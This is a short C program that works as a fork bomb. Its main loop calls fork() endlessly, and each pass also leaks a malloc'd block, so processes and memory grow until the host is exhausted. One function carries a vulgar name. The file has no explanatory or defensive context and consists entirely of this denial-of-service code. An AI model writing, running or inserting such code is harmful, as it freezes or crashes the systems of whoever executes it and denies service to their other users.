#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <malloc.h>

void fuck(void)
{
	char hell[2333];
	memset(hell, 233, sizeof(hell));
	malloc(2333);
}

int main(void)
{
	while (1) {
		fork();
		fuck();
	}
}
